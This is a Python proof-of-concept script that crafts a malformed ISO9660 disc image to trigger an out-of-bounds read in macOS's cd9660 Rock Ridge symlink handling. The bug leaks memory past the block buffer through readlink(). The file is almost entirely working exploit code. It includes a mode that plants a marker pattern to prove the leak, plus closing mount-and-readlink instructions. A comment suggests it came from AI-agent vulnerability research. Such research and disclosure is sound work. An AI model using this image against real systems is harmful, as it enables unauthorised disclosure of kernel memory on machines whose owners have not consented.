#!/usr/bin/env python3
# build_cd9660_sl_poc.py — craft a minimal RRIP ISO9660 that triggers
# _cd9660_rrip_slink OOB read+disclosure: an SL symlink SUSP entry whose
# component-length byte (0xff) makes memmove read past the 0x800 block buffer,
# the OOB bytes returned to userspace via readlink(). macOS 27 26A5353q.
# Codex fleet lane cd9660 static find (vrp_cd9660_rrip_sl_oob_disclosure).
import struct, os

SECT = 2048
NSECT = 64                       # small image
img = bytearray(SECT * NSECT)

def both16(v): return struct.pack('<H', v) + struct.pack('>H', v)
def both32(v): return struct.pack('<I', v) + struct.pack('>I', v)

def dt7(): return bytes([125,1,1,0,0,0,0])   # yr-1900=125 (2025), mon1 day1, +0 gmt

# ---- directory record builder ----
# flags: 0x02 = directory
def dirrec(name, lba, size, flags, susp=b'', skip_tail_pad=False):
    namelen = len(name)
    base = 33 + namelen
    pad = b'\x00' if base % 2 == 1 else b''   # name padding to even
    body = bytearray()
    body += bytes([0])          # [0] length (fill later)
    body += bytes([0])          # [1] ext attr len
    body += both32(lba)         # [2..9] extent
    body += both32(size)        # [10..17] data length
    body += dt7()               # [18..24] datetime
    body += bytes([flags])      # [25] flags
    body += bytes([0])          # [26] file unit size
    body += bytes([0])          # [27] interleave
    body += both16(1)           # [28..31] vol seq
    body += bytes([namelen])    # [32] name len
    body += name                # name
    body += pad                 # pad to even
    body += susp                # system use (SUSP)
    rl = len(body)
    if rl % 2 == 1 and not skip_tail_pad:
        body += b'\x00'; rl += 1
    body[0] = rl
    return bytes(body)

# ---- SUSP entries ----
def susp_SP():   # signals SUSP presence, in root "." record
    return bytes([0x53,0x50, 7,1, 0xBE,0xEF, 0])
def susp_ER():   # Extensions Reference: identifies RRIP_1991A (REQUIRED to activate RR, not just SP)
    return bytes([0x45,0x52, 0x12,1, 0x0a,0x00,0x00,0x01]) + b'RRIP_1991A'
def susp_PX(mode):  # POSIX attrs (RRIP-1991A): mode,nlink,uid,gid each both32 -> len 0x24=36
    return bytes([0x50,0x58, 0x24,1]) + both32(mode) + both32(1) + both32(0) + both32(0)
def susp_SL_evil():  # "SL" len8(even) ver1 flags0 ; comp: flags0 len0xff + 1 byte (declared) -> memmove 0xff OOB
    return bytes([0x53,0x4C, 8,1, 0, 0x00,0xFF, 0x41])

S_IFLNK = 0o120000
PX_LINK = susp_PX(S_IFLNK | 0o777)

# ---- layout ----
# sector 16 PVD, 17 terminator, 18 path tables, 19 root dir block.
ROOT_LBA = 19
# Build root dir block: ".", "..", then "badlink" symlink whose SL ends at block end.
CHILD_LBA = 40   # children MUST use a non-root extent (and clear of path-table/root area) or vget forces VDIR
dot   = dirrec(b'\x00', ROOT_LBA, SECT, 0x02, susp_SP() + susp_ER())  # "." carries SP+ER (activates RRIP)
dotdot= dirrec(b'\x01', ROOT_LBA, SECT, 0x02)              # ".."

# badlink record: name + PX(symlink) + PD(parity) + SL(evil) LAST; even len, ends at block end.
def susp_PD(extra):   # padding SUSP entry, len = 4+extra
    return bytes([0x50,0x44, 4+extra, 1]) + b'\x00'*extra
name = b'badlink'
# header(40) + PX(36) + SL(8 even) = 84 (even). No PD needed; SL is last, even-aligned.
susp = PX_LINK + susp_SL_evil()
rec_badlink = dirrec(name, 200, 0, 0x00, susp, skip_tail_pad=True)  # UNIQUE non-root extent -> VLNK via PX
assert len(rec_badlink) % 2 == 0, f"badlink len {len(rec_badlink)} not even"
# CD_LEAK mode: put badlink earlier and fill 0xCC after it so the SL OOB read returns
# a VISIBLE recognizable pattern (proves disclosure of memory past the symlink target).
_LEAK = int(os.environ.get("CD_LEAK", "0"))   # bytes of 0xCC to plant after badlink (0 = SL at block end)
badlink_start = SECT - len(rec_badlink) - _LEAK

# Records MUST be contiguous (no zero gap, or the dir iterator stops at the gap).
# Fill from end-of-dotdot to badlink_start with contiguous filler dir records (<=255 each).
def filler(R, idx):   # even record of exact size R: namelen = R-33 (odd) -> base even, no pad
    nl = R - 33
    assert 1 <= nl <= 255 and R % 2 == 0
    nm = (b'F%06d' % idx).ljust(nl, b'A')[:nl]
    return dirrec(nm, CHILD_LBA + idx, 0, 0x00, b'')   # UNIQUE non-root extent per child (vnode keyed by extent)

rootblk = bytearray(SECT)
off = 0
rootblk[off:off+len(dot)] = dot; off += len(dot)
rootblk[off:off+len(dotdot)] = dotdot; off += len(dotdot)
gap = badlink_start - off
assert gap >= 0 and gap % 2 == 0, f"gap {gap} parity/space bad"
idx = 0
while gap > 0:
    R = 254 if gap > 270 else gap          # leave >=34 for the last filler
    rec = filler(R, idx); idx += 1
    rootblk[off:off+len(rec)] = rec; off += len(rec); gap -= len(rec)
assert off == badlink_start, f"off {off} != badlink_start {badlink_start}"
rootblk[badlink_start:badlink_start+len(rec_badlink)] = rec_badlink
badlink_end = badlink_start + len(rec_badlink)
sl = susp_SL_evil()
assert bytes(rootblk[badlink_end-8:badlink_end]) == sl, "SL not at badlink end"
if _LEAK:
    rootblk[badlink_end:badlink_end+_LEAK] = b'\xCC' * _LEAK   # recognizable leaked pattern
    print(f"[*] CD_LEAK: planted {_LEAK}x 0xCC after badlink; readlink will disclose them past the 1-byte target")
print(f"[*] {idx} filler recs; badlink rec_len={len(rec_badlink)} @{badlink_start}; SL at block boundary OK")
img[ROOT_LBA*SECT:(ROOT_LBA+1)*SECT] = rootblk

# root directory record (for PVD) — carry SP+ER here too (rrip_offset may read this copy)
root_dr = dirrec(b'\x00', ROOT_LBA, SECT, 0x02, susp_SP() + susp_ER())

# ---- Primary Volume Descriptor (sector 16) ----
pvd = bytearray(SECT)
pvd[0] = 1                       # type 1 = PVD
pvd[1:6] = b'CD001'
pvd[6] = 1                       # version
pvd[8:40]  = b' '*32             # system id
pvd[40:72] = b'CD9660POC'.ljust(32)
pvd[80:88] = both32(NSECT)       # volume space size
pvd[120:124] = both16(1)         # set size
pvd[124:128] = both16(1)         # seq number
pvd[128:132] = both16(SECT)      # logical block size (0x800)
pvd[132:140] = both32(SECT)      # path table size (1 sector worth, minimal)
pvd[140:144] = struct.pack('<I', 18)     # L path table lba
pvd[148:152] = struct.pack('>I', 18)     # M path table lba
pvd[156:156+len(root_dr)] = root_dr      # root directory record
pvd[881] = 1                     # file structure version
img[16*SECT:17*SECT] = pvd

# ---- Volume Descriptor Set Terminator (sector 17) ----
term = bytearray(SECT); term[0]=255; term[1:6]=b'CD001'; term[6]=1
img[17*SECT:18*SECT] = term

# ---- minimal path table (sector 18): one record for root ----
pt = bytearray(SECT)
pt[0]=1            # dir id len
pt[1]=0            # ext attr len
pt[2:6]=struct.pack('<I', ROOT_LBA)   # extent (L = little)
pt[6:8]=struct.pack('<H', 1)          # parent
pt[8]=0            # dir id "\0"
img[18*SECT:19*SECT] = pt

OUT = os.path.expanduser(os.environ.get("CD_OUT", "~/cd9660_poc.iso"))
open(OUT,"wb").write(img)
print(f"[*] wrote {OUT} ({len(img)} bytes)")
print("[*] TEST IN VM: hdiutil attach -nomount cd9660_poc.iso ; mount_cd9660 /dev/diskN /tmp/m ; readlink /tmp/m/badlink")
print("    SL comp_len=0xff, source=block_end -> 0xff OOB bytes disclosed via readlink")
